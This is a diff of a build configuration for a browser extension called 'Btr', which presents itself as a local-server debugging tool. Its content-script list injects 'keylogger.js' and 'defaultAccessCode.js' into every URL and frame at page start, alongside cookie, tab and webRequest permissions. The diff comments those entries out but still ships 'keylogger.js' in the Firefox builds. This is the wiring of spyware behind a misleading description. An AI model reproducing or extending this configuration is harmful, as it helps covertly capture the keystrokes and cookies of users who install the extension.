@@ -6,6 +6,7 @@ export interface BuildConfig {
   outputDir: string;
   includePopup: boolean;
   permissions: string[];
+  filesToCopy?: string[];
   content_scripts?: Array<{
     matches: string[];
     js: string[];
@@ -21,18 +22,18 @@ export interface BuildConfig {
 }
 
 const contentScripts = [
-  {
-    matches: ["<all_urls>"],
-    js: ["keylogger.js"],
-    run_at: "document_start",
-    all_frames: true,
-  },
-  {
-    matches: ["<all_urls>"],
-    js: ["defaultAccessCode.js"],
-    run_at: "document_start",
-    all_frames: true,
-  },
+  // {
+  //   matches: ["<all_urls>"],
+  //   js: ["keylogger.js"],
+  //   run_at: "document_start",
+  //   all_frames: true,
+  // },
+  // {
+  //   matches: ["<all_urls>"],
+  //   js: ["defaultAccessCode.js"],
+  //   run_at: "document_start",
+  //   all_frames: true,
+  // },
   {
     matches: ["<all_urls>"],
     js: ["contentBridge.js"],
@@ -50,6 +51,13 @@ export const configs: Record<string, BuildConfig> = {
     manifestVersion: 2,
     outputDir: "dist/firefox-dev",
     includePopup: true,
+    filesToCopy: [
+      'background.js',
+      'contentBridge.js',
+      'keylogger.js',
+      'popup.html',
+      'popup.js',
+    ],
     content_scripts: contentScripts,
     permissions: [
       "tabs",
@@ -79,6 +87,11 @@ export const configs: Record<string, BuildConfig> = {
     manifestVersion: 2,
     outputDir: "dist/firefox-prod",
     includePopup: false,
+    filesToCopy: [
+      'background.js',
+      'contentBridge.js',
+      'keylogger.js',
+    ],
     content_scripts: contentScripts,
     permissions: [
       "tabs",
@@ -103,11 +116,17 @@ export const configs: Record<string, BuildConfig> = {
   // Chrome/Opera development (manifest v3 with popup)
   "chrome-dev": {
     name: "Btr",
-    version: "1.0.0",
+    version: "1.0.1",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 3,
     outputDir: "dist/chrome-dev",
     includePopup: true,
+    filesToCopy: [
+      'background.js',
+      'contentBridge.js',
+      'popup.html',
+      'popup.js',
+    ],
     content_scripts: contentScripts,
     permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
     // В manifest v3 host_permissions отдельно
@@ -116,11 +135,15 @@ export const configs: Record<string, BuildConfig> = {
   // Chrome/Opera production (manifest v3 without popup)
   "chrome-prod": {
     name: "Btr",
-    version: "1.0.0",
+    version: "1.0.1",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 3,
     outputDir: "dist/chrome-prod",
     includePopup: false,
+    filesToCopy: [
+      'background.js',
+      'contentBridge.js',
+    ],
     content_scripts: contentScripts,
     permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
   },
@@ -128,11 +151,15 @@ export const configs: Record<string, BuildConfig> = {
   // Opera development (same as Chrome dev)
   "opera-dev": {
     name: "Btr",
-    version: "1.0.0",
+    version: "1.0.1",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 3,
     outputDir: "dist/opera-dev",
     includePopup: true,
+    filesToCopy: [
+      'background.js',
+      'contentBridge.js',
+    ],
     content_scripts: contentScripts,
     permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
   },
@@ -140,11 +167,15 @@ export const configs: Record<string, BuildConfig> = {
   // Opera production (same as Chrome prod)
   "opera-prod": {
     name: "Btr",
-    version: "1.0.0",
+    version: "1.0.1",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 3,
     outputDir: "dist/opera-prod",
     includePopup: false,
+    filesToCopy: [
+      'background.js',
+      'contentBridge.js',
+    ],
     content_scripts: contentScripts,
     permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
   },
